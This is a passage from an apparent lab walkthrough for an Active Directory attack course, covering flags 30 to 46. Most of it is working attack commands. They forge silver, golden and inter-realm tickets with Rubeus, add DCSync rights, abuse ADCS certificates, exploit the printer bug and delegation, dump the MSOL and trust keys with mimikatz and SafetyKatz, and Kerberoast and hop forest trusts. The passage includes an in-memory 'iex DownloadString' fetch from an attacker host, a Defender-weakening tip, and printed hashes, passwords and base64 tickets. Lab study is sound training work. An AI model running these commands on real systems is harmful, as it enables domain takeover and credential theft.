</code></pre>

<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

us-dc$ rc4:  _f4492105cb24a843356945e45402073e_

## Flag 30 - Silver Ticket

Create a silver ticket for the dc machine using the rc4 previously obtained

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args silver /service:http/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt
```
{% endcode %}

## Flag 31 - DCSync

Check if we have DCSync rights with PowerView

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser64"}
</strong></code></pre>

We got no output, so we don't have permissions.

Set DCSync right on studentuser64 using a ticket from a domain administrator

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser64 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```
{% endcode %}

And now i could DCSync with studentuser64

## Flag 32/33/34 - ADCS

To enumerate use Certify

```
C:\AD\Tools\Certify.exe /find
```

<figure><img src="../.gitbook/assets/immagine (27).png" alt=""><figcaption></figcaption></figure>

We already have pwadmin and with the enrollment rights we can request a crtificates for any user.

{% code overflow="wrap" %}
```
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (28).png" alt=""><figcaption></figcaption></figure>

Now copy the certificate and convert it using the suggested command

{% code overflow="wrap" %}
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -outC:\AD\Tools\DA.pfx
```
{% endcode %}

And now request a ticket using the certificate

{% code overflow="wrap" %}
```
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:pass  /nowrap /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (29).png" alt=""><figcaption></figcaption></figure>

## Flag 35 - Unconstrained Delegation over parent domain

Remember that webmaster has unconstrained delegation, so we can use it to obatin a ticket for a enterprise admin. So craft a ticket as webmaster and transfer the loader on us-web to start rubeus as a monitor

{% code overflow="wrap" %}
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:TECHCORP-DC$ /interval:5 /nowrap
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (30).png" alt=""><figcaption></figcaption></figure>

Now by abusing the printer bug we can request a ticket with MS-RPRN.exe

```
C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
```

The next steps are the same from the previous Unconstrained Delegation.

## Flag 36/37/38 - Azure Integration

We can find out the machine where Azure AD Connect is installed by looking at the Description of special account whose name begins with MSOL\_.

Using AD-Module:

{% code overflow="wrap" %}
```powershell
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (31).png" alt=""><figcaption></figcaption></figure>

We already have access to US-Adconnect as helpdeskadmin so we can extract MSOL account with adconnect.ps1

<pre data-overflow="wrap"><code><strong>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
</strong></code></pre>

Now open a invishell session on us-adconnect

{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InShellProf.dll /Y
```
{% endcode %}

{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat /Y
```
{% endcode %}

And now bypass the amsi and run the script in memory

{% code overflow="wrap" %}
```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.64/adconnect.ps1')
```
{% endcode %}

{% hint style="info" %}
if an error happen when launch "ADConnect" use `Set-MpPreference -drtm $true`
{% endhint %}

<figure><img src="../.gitbook/assets/immagine (32).png" alt=""><figcaption></figcaption></figure>

MSOL\_16fb75d0227d : 70\&n1{p!Mb7K.C)/USO.a{@m\*%.+^230@KAc\[+sr}iF>Xv{1!{=/\}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf

Now as shell as this user can be created

```
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

now launch invishell and import Invoke\_mimi

{% hint style="info" %}
If it's not working try to use a non elevated shell
{% endhint %}

{% code overflow="wrap" %}
```
Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (33).png" alt=""><figcaption></figcaption></figure>

Enterprise admin rc4: bc4cf9b751d196c4b6e1a2ba923ef33f

## Flag 39 - From DA to EA with trust key

First we need a DA access to dump the trust key

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

Then copy the Loader on the DC

{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
```
{% endcode %}

and then use it to launch SafetyKatz and dump the trust key

{% code overflow="wrap" %}
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch exit"
```
{% endcode %}

trust key rc4 : _6f9f71933364a163756d51cbcde9b4e1_&#x20;

And now let's forge a ticket with the SID of the enterprise admins group

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args silver /user:Administrator /ldap /service:krbtgt/TECHCORP.LOCAL /rc4:6f9f71933364a163756d51cbcde9b4e1 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /nowrap
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (34).png" alt=""><figcaption></figcaption></figure>

and use it to ask for a tgt

<pre data-overflow="wrap"><code><strong>C:\AD\Tools\Rubeus.exe asktgs /service:CIFS/techcorp-dc.TECHCORP.LOCAL /dc:techcorp-dc.TECHCORP.LOCAL /ptt /ticket:doIFyzCCBcegAwIBBaEDAgEWooIEvDCCBLhhggS0MIIEsKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5URUNIQ09SUC5MT0NBTKOCBG0wggRpoAMCARehAwIBA6KCBFsEggRXGdFUp/HivJhWYK2EvJwht4v8w8/7pVzEdTetAX91NVn2X/vjNxO/3Puo6LO//RSYEXaagw8lZKKHyQgfz1SXprWfsDsLAqiMO6fyfjzZTlOOH/7WnPZYSONxMTQVCxgyxlv4G3hSGIPJTGxIt7wgme9Cx9aX4LOlnPTm9U0uKHDQX/aCChXjkgbu7NkLeJ/9KRWhOOdH0ZmPzHISQyB+PW3fMmJT+cY6NNi/eAYbBwpGJ20axom4NMmyE1Vkv++KYYddEc5gtaVVSMrv5YiKzm1gqYx08PRXG0W1dJ9q8Ne5pP6WWGnAmh+1DqQi0VSkGqLv+Tvhf5LPmWeqonBLYxOq18AVaeBmLFt4AfTl9YwvDMYCRWAPzbG9JU8cDtrSVsPkOanqyD+zT5lYhHXZgclN0ZPxQvmSTqALuQzhVO+oBlAbDnSsUfaPUHcq20yKe/yEUY+E+SG1dB67Wo0XaMEaD60mb2jyt9ljYb9rnmJuxwMCWowtTkL6wDYX3rEUFJ896/0Z7/0yra11V9y1nklm1ZVQyaVyXvsiGQ+6HTG1BPUXbkhoCHtQIQ6EGZCaW4krpg25ooQNltolYESTRbQIZ3ZMv6kw65jZqhLWvVO2trfVdVj1RnfZA0bBFb1KJC7Eo/upRCpB7THgMWOERZo/9ckiOQGxqQv2EPiwViD+vFQs/x0gTxIvrHu/ygxSvYZUkSkqElu/jBoBBEPHfuVjn9rIkcgfbNPt4siAss6gQjIKOlFOFOGs84dA+f984DaW8mOCPUlY6BmSLjVR7aoXgHBFobNWIw21da27hBxXsWAyIZTv6zxtwmKA/eKA5ieJA9mEmLZckXXdcii5HUhyYGj7MuJYaSfFl5+niC1OBe9BE/+PrgQQcwr6CpMsSPrDVjWGKTrYP5PUrdVUP8jGY3Ss8ukgLwan83zZpRm0lckYhrdI3tpEZk1JHfOd0pzEq6uDs6VhzrhdO7yFsG1EcWacnmA0GjCer1QN76qtV6GAxO60UkF4wBIIQUqAOvh7LG/HeaUP6b11FLJ6LS1F1dsjK4gcEtfeABXAoRQdfcxK7WX/K8MjHwhL9C43SXAU4MvkDC8tD4O6gwfF3HQmh/SxUyCkC6mOCBDwDRnQ8Z4cKu6Ypzi+X0Xi+AJfOsCaDMfS2eFEvaHcASfW61KIpAgCUzbIu71zA7uXmOP6qwCQd1NpFIirKysoabIlaDMeae+1FoEv3X9NRn/ledU+BaqhqSarIdTfG+PpNRdXIxZ6liE5xaszEHCqsI8oWbWCxNQKxpXBgQOp/jPuhisVFF53XM6GGku/5XXilsOeShqQYX70MNy6hPMPBbC0gTspuHzxSTt5oYBh3ctk4wdcSCyQ5sU9CgGc4vpKPZoR3PogebyHcxCWeurV0rI+1GOi/FO5kVZ3wp56JAUBcQAznAjKXDYjLqQn5Pl4Gw0qja9iZ7UibKYMskRZ/0kjtb8JOajnBKOB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoBswGaADAgEXoRIEENZWObe+6zSQi8Q7xPt3E9KhExsRVVMuVEVDSENPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjQwNTAzMTM1MzExWqURGA8yMDI0MDUwMzEzNTMxMVqmERgPMjAyNDA1MDMyMzUzMTFapxEYDzIwMjQwNTEwMTM1MzExWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVEVDSENPUlAuTE9DQUw=
</strong></code></pre>

<figure><img src="../.gitbook/assets/immagine (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/immagine (36).png" alt=""><figcaption></figcaption></figure>

## Flag 40/41/42 - Kerberoasting on another domain

Launch invishell and us ad-module to find kerberoastable account

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /user:Administrator /id:500 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /ptt
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
```
{% endcode %}

## Flag 43 - Constrained Delegation to another domain

Look for account with constrained delegation in eu.local with AD-Module

{% code overflow="wrap" %}
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (37).png" alt=""><figcaption></figcaption></figure>

We already cracked the password of this user previously (Qwerty@123) so we need to craft the NTLM hash of that user

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
```
{% endcode %}

storagesvc ntlm : 5C76877A9C454CDED58807C20C20AEAC

and run a s4u attack with rubeus to craft a ticket

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (38).png" alt=""><figcaption></figcaption></figure>

Now launch a DCSync attack

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:eu\krbtgt /domain:eu.local" "exit"
```
{% endcode %}

## Flag 45 to 49 - Printer Bug to another domain

If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well

Start a process with the webmaster ticket

{% code overflow="wrap" %}
```
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

Now copy the loader on the us-web machine

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y
```

And launch rubeus monitor

{% code overflow="wrap" %}
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:usvendor-dc$ /interval:5 /nowrap
```
{% endcode %}

Next use MS-RPRN to abuse the printer bug

<pre data-overflow="wrap"><code><strong>C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

And now the ticket can be imported and can launch a DCSync

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadum::dcsync /user:usvendor\krbtgt /domain:usvendor.local" "exit"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

usvendor krbtgt rc4: _335caf1a29240a5dd318f79b6deaf03f_

## FLag 46 -Share over Domain

We have DA access on the eu.local forest that has a trust relationship with euvendor.local. Let's use the trust key between eu.local and euvendor.local. We can extract the trust key using a Golden ticket for eu.local

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
```
{% endcode %}

{% tabs %}
{% tab title="WinRS" %}


{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\Loader.exe \\eu-dc.eu.local\C$\Users\Public\Loader.exe /Y
```
{% endcode %}

set with argsplit "lsadump::dcsync" and launch safetykatz to dump the krbtgt hash and then the trust key

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /user:eu\euvendor$ /domain:eu.local" "exit
```
{% endcode %}

krbtgt eu.local rc4: _2402af4780a2f427256308f25eb793dc_

Now, forge an inter-realm TGT between eu.local and euvendor.local. We need to run the following commands from eu-dc:

set with argsplit "silver"

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:Administrator /ldap /service:krbtgt/eu.local /rc4:2402af4780a2f427256308f25eb793dc /sid:S-1-5-21-3657428294-2017276338-1274645009 /nowrap
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

and now use the ticket with rubeus "asktgs" option

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFEzCCBQ+gAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCA9wwggPYoAMCARehAwIBA6KCA8oEggPGTRbxHRhSyYdkdTt6ijhWyp6ENzJYehwraib3862XHwBmMPlPEZkYSE8D26uHuCtvtzE+oJcLzLDlAlG/vWvVqgH/vM0klSbPbALh+6mGFmWucw3htlSV2tq8Evnln5EDcSw0vjbVWGED4w26iW3H60VT3fA1pL7T4qYKjOKN7K7JM7zTnv9jv/vXiqznj8GQ1rf2C3JKn0BRShg+/FbGsS3CqYidS7IaEgdf5S7EP89NzpO53y/1AsVOs+TjINDPCaOiRMNmZ5iZs11jqErvD/qX0CbMSVXrTFVSjneMIdppIuSLeo6sK3Z0GxKjWT+A1DmQ5p2rwSYiqnbjmR1ZTE8ClifwEduZsyYKFi2HeMrxctYRmP+Nb1WGysUhgUeeQwRc6m7BrtteYurL7oJICdFoC4dGhso9nVxMQT5lUWFC8dKdqeY/BJXXd8CN5MXuWacbWTwc4Tp3BI2EJKS9jCD+Yu8dJ50kSYeWhKjnjwf782QbWAbdc5C6MGobxRZmLp9UySMHdxMuTodp9ygkAUO8v7pIK8btYzkZCgnHzYApeawAN0//Zwk1lYjcKTw0EOPinSkjbenqvEGCRrVSwImG/Hp1LVhNcso7g7wNM5xhMI9DrSxV1EjS+PXKbd5+2BKxLK6aW20brKzN3Mf10CDeXUBTGAK896LjIVl0bHE4qpdCZrMRw5iAcoGkED5mZEshyRL5d/crbYZfhFWxPDBbo/t9CIHXpc8hmz37nXP3a078gsCAoEIETNGp4ptNcdSMoRi7ILd8lHn+q8TXpt3yXCsB6NQVNb9zxMsc6T8zRv+RIRMT/J6vo941/x/6HUwP1WOttkICcEVqvxzqdWYoMQ+qHdaXpTe4je9PKWMsvPdWGufB1t93Fl2HlKVjvLVNOZiOuK2u+Pc4l8y92ZZdOJFvU+daTPP0dBGTbkksoGTgAG8u0xZedxO6hoNl8pMGOD8O6+6IEaxgQHWEQSZbTFwd9wW+hBvWWL5DXhl8x873TfupgPMt38jX0zkq0OAVc6L6DfIWH6vw1qnrTtF1URzOZwqReCmDB7LQaukr8Ui/GCbPu58QAmlBHuO/TI0tAyD5HUuDIYLxaJYkJK/WuwIsqzn2XSrKGwktI3vP31Lp5DuteJ77fSnTv3HBo9yVOtw/gZECglNdSj5RloMV6jAuniO6NAwzyH1PoHX9PsFiTF1NcQh9r85dr3Jwdb3TS302mo3QzerniqbIO6lszHD6E4WIsVMwHW65jYmHWhAU78cHh9eskKy/qDcnoAqymEjDo4HiMIHfoAMCAQCigdcEgdR9gdEwgc6ggcswgcgwgcWgGzAZoAMCARehEgQQ4L3FEyjnUViFSjetqseKjqEKGwhFVS5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyNDA1MDYxNDU3MzVapREYDzIwMjQwNTA2MTQ1NzM1WqYRGA8yMDI0MDUwNzAwNTczNVqnERgPMjAyNDA1MTMxNDU3MzVaqAobCEVVLkxPQ0FMqR0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbA==
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="PS-Remoting" %}
Let's check if SIDHistroy is enabled for the trust between eu.local and euvendor.local using the Active Directory module.

```
Get-ADTrust -Filter * -Server eu.local
```

Get-ADObject -Identity "CN=SID History,CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Server euvendor.local -Properties AllowedAttributes

Transfer InviShell on the machine:

{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\eu-dc.eu.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\eu-dc.eu.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
```
{% endcode %}

Now access with Winrs and launch Invishell. Now check if there are any groups with SID>1000 in euvendor.local that we can impersonate to avoid SIDFiltering&#x20;

{% code overflow="wrap" %}
```
Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

Now craft a silver ticket with the sid of the chosen group

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659c7b2109d2e63e6de676d48646c /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /nowrap
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Now use the generated ticket to ask a tgs

<pre data-overflow="wrap"><code><strong> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:http/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFOzCCBTegAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCBAQwggQAoAMCARehAwIBA6KCA/IEggPuPfLV68znCcJWOfT23POLxq8A/estsOZq3Sg7gyhAYqrbvpOPI8IJrPgRc+RJw/8/MXUF2WPtt7CfWw9LsZ4j4nPIfWudUXrdciUCDkBWmomY/T3wU/I6IGr7GcYoSf+MMWq7pRygM6FedzYREj1HPtN2W2RWt/Qn4f1oWziZ4AOLn7KCchW06EWBHmIdhAMfaqqfAXyjLzzAyaNOjXMuvupenHUy6iPD2NmbosKd9fqo6G9nef2cW953oE4grYhFy0FY3Qvh10HmpgGGfqdRPXPPy4LGIFVuDTa1ei0ti5vS0TM8dFm1V7WgolOcae7cqGkAgH3cx1aq/Ic4kgHI0OUoyc/l9Fw1UOUaic1TYkbdOQ0h8643SG8oEWHcGgOy6/enZ+LEF1JluY39jatYW6l/HJxWCiKBd0Zbv54Py2kF4YweG8eeAWxNn3ekoMXs5wPzhuJ3s+By4v2j/ZggpWcooAjITGVyEmB66m7GOAJG8U84zdIRheCb/KXsJvDNGvL3PD9lWs5C2BF8LQPLyWZwefNPbGoq9WCjP2kHHnqm5BmNy9XkK+bxrcfDaqK8Q0CfUSzw5mWhhSwD0HrBb0u6JbMVQcYvuVK7+wcyMI2GBsOwNClfy6qfCJ72qXmcHIPhmEIiulmls40s7OCT2/x/TGDBFqFCYOHMnDZsjDm0YmvPLftiuz2Urj/uDQmdcLxUrWJ3dDyhwSubhfXzfbI1cI+l+m9GZfL4+tgVppdoiYa1+SdBFd4Yo83PS40KZlL7QqmwNVfXf26tlD75wo9b6r9A7p57zxRlXIGNXPMdciRkDSXL1TO9LTquwtE3GH/frOCuHCQzILOBPh9OXS1yzR+l6ZIzUgcexabBy5AGfZv8HO9qZN52UY9m+YABmqsG4gyAKq84rLpdy2VGAiBZ8m+uOeEQySL0K9yso80on0nPEDEc5SzaTOq2m8rn89ft7owwZ5RsA/zrSsgeT6nY1auOLDWOsY+eu5dJCrwoGzXYCH3trEj5lFv5FGqXFIxa5I1y6WmJsfuFohYmvX/MmILJFTTZ3OWWqZZEtH7qEB/I7/z9RgkEM3NpWiopMs/ENwMRvn2uSP/B7kP7QvSsUgLhgJ7oa4MHaTRr304uCZJhOJyNPx6fka6Q9hbgoj3DcgXM2E9RWKn2xAs15EaaaH4+RZHjDQ0DDfSrPH5Dff2+Nilj0eizxZ2YwTh6/ltEi1ylFNMKT7tdMrcIg94npWmBRWgBGOwhciCciA6h75pS/qsThTrrIsBmOJ55nRmaVsBxPgeDpkWE7glUS3Ek/Awt9tWc01ilk/Je4Tg+M1sEV6W5uc28XW3m